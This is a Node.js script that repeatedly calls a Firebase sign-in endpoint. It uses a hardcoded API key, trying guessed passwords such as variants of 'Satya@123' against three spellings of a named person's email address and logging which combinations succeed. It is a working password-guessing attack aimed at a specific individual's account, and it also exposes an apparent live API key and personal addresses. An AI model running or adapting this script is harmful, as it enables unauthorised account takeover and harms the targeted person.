import https from 'https';

const API_KEY = 'AIzaSyB5sN1axynuVlmzK0k6lLrvL3PbsR7x0QA';

function request(url, method, body) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const headers = { 'Content-Type': 'application/json' };
    const bodyStr = body ? JSON.stringify(body) : null;
    if (bodyStr) headers['Content-Length'] = Buffer.byteLength(bodyStr);

    const req = https.request(
      { hostname: u.hostname, path: u.pathname + u.search, method, headers },
      (res) => {
        let data = '';
        res.on('data', c => data += c);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(data);
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(parsed);
            } else {
              reject(new Error(`HTTP ${res.statusCode} ${method} ${url}\n${data}`));
            }
          } catch {
            resolve(data);
          }
        });
      }
    );
    req.on('error', reject);
    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

async function trySignIn(email, password) {
  try {
    const res = await request(
      `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}`,
      'POST',
      { email, password, returnSecureToken: true }
    );
    console.log(`✅ Success for ${email} with password "${password}": UID = ${res.localId}`);
    return res;
  } catch (err) {
    console.log(`❌ Failed for ${email} with password "${password}": ${err.message}`);
    return null;
  }
}

async function main() {
  const emails = [
    'satya.ranjan.dash@kalpanaaa.in',
    'satya.ranjan.das@kalpanaaa.in',
    'Satya.ranjan.Dash@kalpanaaa.in'
  ];
  const passwords = [
    'Satya@2026!',
    'Satya@123',
    'Satya@123456',
    'Satya@1234',
    'satya123'
  ];

  for (const email of emails) {
    for (const pass of passwords) {
      await trySignIn(email, pass);
    }
  }
}

main().catch(console.error);
